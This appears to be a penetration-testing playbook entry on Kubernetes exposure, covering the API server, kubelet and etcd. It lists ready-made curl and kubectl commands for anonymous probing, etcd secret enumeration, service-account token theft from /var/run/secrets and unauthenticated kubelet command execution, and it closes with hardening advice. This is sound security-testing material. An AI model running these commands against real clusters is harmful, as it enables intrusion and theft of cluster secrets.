---
id: kubernetes
technology: "Kubernetes (API/kubelet/etcd)"
domain: IT
safety_class: safe
severity: critical
life_safety: false
match:
  ports: [6443, 10250, 2379, 2380, 10255, 10257, 10259]
  banners: ["kubernetes", "k8s", "kube-apiserver", "etcd", "kubelet"]
  markers: ["/api/v1/pods", "/api/v1/namespaces", "/api/v1/nodes", "/openapi/v2", "/apis/apps/v1", "/readyz", "/livez", "kube-apiserver", "kubelet/v1", "/v3/keys", "etcd-cluster-id"]
quick_wins:
  - { cmd: "curl -sk https://{host}:6443/version", safety: safe, note: "Fetch API server version anonymously; confirms unauthenticated access if 200 OK" }
  - { cmd: "curl -sk https://{host}:6443/api/v1/namespaces", safety: safe, note: "List namespaces anonymously; success indicates anonymous-auth is enabled" }
  - { cmd: "curl -sk https://{host}:10255/pods", safety: safe, note: "Read-only kubelet read-only port; lists all pods on the node without auth" }
  - { cmd: "curl -sk https://{host}:2379/v3/keys --cert <cert> --key <key>", safety: safe, note: "Enumerate etcd keys; exposes secrets, tokens, and cluster state if accessible" }
  - { cmd: "kube-hunter --remote {host}", safety: intrusive, note: "Active Kubernetes cluster enumeration; probes API server, kubelet, and etcd for misconfigs" }
  - { cmd: "curl -sk -H 'Authorization: Bearer <sa-token>' https://{host}:6443/api/v1/secrets", safety: intrusive, note: "Use a discovered service-account token to list cluster secrets (requires token)" }
  - { cmd: "curl -sk --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces", safety: intrusive, note: "In-pod SA-token abuse: enumerate namespaces from within a compromised container" }
  - { cmd: "kubectl --server=https://{host}:6443 --insecure-skip-tls-verify auth can-i --list --as=system:anonymous", safety: intrusive, note: "Enumerate RBAC permissions granted to anonymous users on the API server" }
  - { cmd: "curl -sk -X POST https://{host}:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'", safety: disruptive, note: "Kubelet exec endpoint (no auth): remote command execution inside a container — gated, write/state-changing" }
references: ["CVE-2018-1002105", "CVE-2019-11247", "CVE-2019-11248", "CVE-2020-8558", "CVE-2021-25741", "CVE-2022-3294", "CISA KEV CVE-2018-1002105"]
mitre: "T1552.007"
---
# Kubernetes guidance

Kubernetes exposes three primary attack-surface ports on each node: the API server (6443), the kubelet agent (10250 for the authenticated exec API; 10255 for the deprecated read-only HTTP API), and etcd (2379/2380). A misconfigured cluster may allow unauthenticated access to any of these. The `/version` and `/healthz` endpoints on 6443 are commonly world-readable even when the rest of the API is locked down, providing a free banner for fingerprinting. The read-only kubelet port (10255) was enabled by default in older cluster builds and exposes full pod manifests including environment variables at `/pods` without any credential.

During an authorized engagement, begin with safe, read-only probes: hit `/version`, `/api/v1/namespaces`, and `/api/v1/pods` anonymously on 6443 to detect anonymous authentication. Check 10255 for the read-only kubelet. If etcd is reachable on 2379 from the test host, enumerate its key space — etcd stores all cluster state in plaintext including Kubernetes secrets and bootstrap tokens. Document each exposure before escalating. Use `kube-hunter --remote` for a structured, non-destructive remote scan that maps the attack surface methodically.

Service-account (SA) token abuse is the primary intrusive vector: tokens projected into pods at `/var/run/secrets/kubernetes.io/serviceaccount/token` often carry over-permissive RBAC roles (e.g., `cluster-admin`). From a foothold inside any container, check RBAC with `auth can-i --list` and attempt to list secrets or exec into other pods. The kubelet `/run` (exec) endpoint on 10250 with `--anonymous-auth=true` allows unauthenticated RCE into any pod on the node — mark this as disruptive and gate it behind explicit engagement approval. CVE-2018-1002105 (privilege escalation via API server proxy) and the anonymous-auth kubelet misconfig are the two findings most commonly encountered in real clusters.

Remediation centres on four controls: disable `--anonymous-auth` on both the API server and kubelet; enforce network policy so etcd is reachable only from control-plane nodes; audit RBAC roles and remove wildcard bindings especially for default service accounts; and rotate any exposed SA tokens or bootstrap tokens immediately. Reference CIS Kubernetes Benchmark and NSA/CISA Kubernetes Hardening Guide for a complete baseline.
